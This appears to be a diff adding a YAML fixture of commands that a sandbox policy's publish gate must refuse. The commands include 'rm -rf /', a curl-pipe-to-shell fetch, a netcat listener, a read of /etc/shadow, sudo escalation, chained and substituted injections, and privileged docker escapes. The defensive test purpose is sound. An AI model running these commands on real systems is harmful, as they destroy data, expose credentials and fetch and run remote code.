@@ -1,0 +1,25 @@
+# Publish test gate (README 7A step 2): attacks every policy must refuse, on every target.
+# Each runs as a one-step plan with cwd set to the target's first workspace root. Publishing is blocked if
+# any of them is allowed. Shells, privilege escalation and raw network tools must never be on the allowlist.
+- {id: rm-root, kind: shell, command: "rm -rf /"}
+- {id: rm-no-preserve-root, kind: shell, command: "rm -rf --no-preserve-root /"}
+- {id: rm-dotdot-root, kind: shell, command: "rm -rf ../../../.."}
+- {id: shell-c, kind: shell, command: "sh -c id"}
+- {id: bash-c, kind: shell, command: "bash -c id"}
+- {id: sudo, kind: shell, command: "sudo id"}
+- {id: su, kind: shell, command: "su -c id root"}
+- {id: netcat, kind: shell, command: "nc -l 4444"}
+- {id: pipe-to-shell, kind: shell, command: "curl http://example.com/x | sh"}
+- {id: chain-semicolon, kind: shell, command: "npm ci; id"}
+- {id: chain-and, kind: shell, command: "npm ci && id"}
+- {id: subshell, kind: shell, command: "npm run $(id)"}
+- {id: backticks, kind: shell, command: "npm run `id`"}
+- {id: redirect, kind: shell, command: "npm ci > /etc/passwd"}
+- {id: read-shadow, kind: shell, command: "cat /etc/shadow"}
+- {id: write-etc, kind: shell, command: "npm --prefix /etc ci"}
+- {id: setuid, kind: shell, command: "chmod 4755 x"}
+- {id: agent-keys, kind: shell, command: "npm run /var/lib/warden-agent/keys"}
+- {id: docker-privileged, kind: docker, command: "docker run --privileged alpine"}
+- {id: docker-mount-root, kind: docker, command: "docker run -v /:/host alpine"}
+- {id: docker-host-pid, kind: docker, command: "docker run --pid=host alpine"}
+- {id: invisible-char, kind: shell, command: "npm\u200b ci"}
